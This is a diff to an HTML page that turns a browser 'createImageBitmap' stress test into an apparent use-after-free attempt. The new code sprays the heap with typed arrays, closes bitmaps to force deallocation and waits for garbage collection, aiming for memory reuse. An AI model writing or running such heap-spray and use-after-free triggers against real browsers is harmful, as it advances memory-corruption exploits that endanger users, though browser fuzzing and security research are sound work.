@@ -2,53 +2,53 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>createImageBitmap Stress Test</title>
+  <title>createImageBitmap UAF Attempt</title>
   <style>
-    body {
-      background: black;
-      color: lime;
-      font-family: monospace;
-      padding: 10px;
-    }
-    #log {
-      white-space: pre-wrap;
-    }
+    body { background: black; color: lime; font-family: monospace; }
+    #log { white-space: pre-wrap; padding: 1em; }
   </style>
 </head>
 <body>
-  <h1>createImageBitmap Stress Test</h1>
+  <h1>createImageBitmap UAF Test</h1>
   <div id="log">Running...</div>
   <script>
     const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
-    async function stressTest() {
-      const canvas = document.createElement('canvas');
-      canvas.width = 1024;
-      canvas.height = 1024;
-      const ctx = canvas.getContext('2d');
+    async function run() {
+      let canvas = new OffscreenCanvas(64, 64);
+      let ctx = canvas.getContext('2d');
       ctx.fillStyle = 'red';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillRect(0, 0, 64, 64);
 
-      const iterations = 1000;
-      let bitmaps = [];
+      let ref = null;
+      let recycled = [];
 
-      for (let i = 0; i < iterations; i++) {
+      for (let i = 0; i < 10000; i++) {
         try {
-          const bitmap = await createImageBitmap(canvas);
-          bitmaps.push(bitmap);
-          if (i % 100 === 0) {
-            log(`[+] Created ${i} bitmaps`);
-          }
+          ref = await createImageBitmap(canvas);
+          if (i % 1000 === 0) log(`[+] Allocated ${i} bitmaps`);
         } catch (e) {
-          log(`[-] Exception at iteration ${i}: ${e}`);
+          log(`[-] Error at ${i}: ${e.message}`);
           break;
+        }
+
+        if (i % 20 === 0) {
+          // Spray heap with random garbage to increase chance of reuse
+          for (let j = 0; j < 100; j++) recycled.push({ leak: new Uint32Array(1024) });
+        }
+
+        if (i % 500 === 0) {
+          ref.close(); // Force deallocation
+          ref = null;
+          await new Promise(r => setTimeout(r, 10)); // Give GC time
         }
       }
 
-      log("[+] Stress test completed");
+      log("[+] Done.");
     }
 
-    stressTest();
+    run();
   </script>
 </body>
 </html>
+
